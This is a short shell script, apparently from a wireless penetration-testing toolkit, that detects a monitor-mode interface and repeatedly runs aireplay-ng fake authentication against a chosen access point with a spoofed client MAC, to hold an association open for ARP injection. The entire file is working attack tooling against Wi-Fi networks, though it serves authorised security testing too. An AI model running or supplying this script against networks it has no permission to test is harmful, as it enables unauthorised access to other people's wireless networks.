#!/bin/sh

if [ $# -lt 2 ]; then
	echo "Usage: $0 <AP BSSID> <SSID>"
	echo "This application will try to maintain the fake client association"
	echo "to the specified ap.  This is sometimes required when no clients"
	echo "are associated and arp injection becomes disassociated."
	echo " "
	echo "<AP BSSID>   can be discovered through wireless.display_aps.sh"
	echo "             in the top section."
	echo "<SSID>       SSID of network to test.  E.g.: linksys"
	echo "All BSSID/Macs are of the format 01:02:03:04:05:06"
	echo " "
	exit 1
fi

APMAC=$1
# Fake client mac
CLIENTMAC="00:06:25:c1:E5:38"
SSID=$2

# MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio --max-count=1 "^.*?IEEE" | sed "s|\sIEEE||" | sed "s|\s||"`
MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio "^[a-z,A-Z,0-9]{3,7}" | sed "s|\sIEEE||" | sed "s|\s||"`

if [ ${#MONINTERFACE} -gt 0 ]; then
	# Fake auth every 30 seconds.  -D says don't wait for a beacon / don't detect AP's presence
	echo "Fake authenticating..."
	while [ 1 -eq 1 ]; do
		aireplay-ng -D --fakeauth=30 -e "$SSID" -a $APMAC -h $CLIENTMAC $MONINTERFACE 2> /dev/null
	done
else
	if [ $VERBOSE -eq 1 ]; then
		echo "ERROR: No monitoring interface configured."
	fi
fi

